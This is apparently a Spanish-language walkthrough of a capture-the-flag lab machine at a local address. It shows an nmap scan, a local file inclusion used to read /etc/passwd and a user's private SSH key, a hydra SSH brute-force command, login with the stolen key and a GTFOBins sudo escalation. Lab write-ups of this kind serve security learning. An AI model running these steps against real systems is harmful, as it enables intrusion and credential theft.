Fecha: 07/09/2024

Empiezo usando nmap: 
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](Imágenes/Pasted%20image%2020240907212050.png)

En el puerto 80 hay el siguiente recurso web: 
![](Imágenes/Pasted%20image%2020240907212332.png)

Presiono en "Ejemplos de computadoras infectadas" y me encuentro con el siguiente path, que podría ser vulnerable a local file inclusion:
![](Imágenes/Pasted%20image%2020240907212415.png)

Cambio "./ejemplo1.png" por "=/etc/passwd" y, efectivamente, puedo ver el contenido del fichero: 

![](Imágenes/Pasted%20image%2020240907215415.png)

Usaré hydra para buscar una contraseña para `nico`:
```bash
sudo hydra -l nico -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 16 
```

Como tarda demasiado, me imagino que no es la forma de continuar. Miro por tanto el archivo /home/nico/.ssh/id_rsa: 

![](Imágenes/Pasted%20image%2020240907215504.png)

Creo una copia local (usando Control+U para ver el html fuente y formartearlo bien) para usarla para acceder por ssh: 
```bash
ssh -i id_rsa nico@172.17.0.2
```

Me dice que los permisos del fichero son demasiado altos para usarlos, así que los bajo: `chmod 600 id_rsa` 

![](Imágenes/Pasted%20image%2020240907220206.png)

Uso el comando encontrado en https://gtfobins.github.io/gtfobins/env/#sudo y: 

![](Imágenes/Pasted%20image%2020240907220305.png)

